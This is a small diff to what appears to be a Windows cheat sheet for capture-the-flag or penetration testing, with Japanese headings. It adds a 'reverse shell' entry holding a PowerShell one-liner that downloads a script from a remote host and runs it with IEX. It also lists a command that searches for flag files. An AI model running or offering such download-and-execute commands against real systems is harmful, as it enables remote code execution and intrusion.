@@ -1,5 +1,10 @@
 # Windows
 
+### reverse shell
+```
+powershell.exe -a "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.180/hogehoge.ps1')"
+```
+
 ### fileの発見
 `dir flag* /s /p`
 
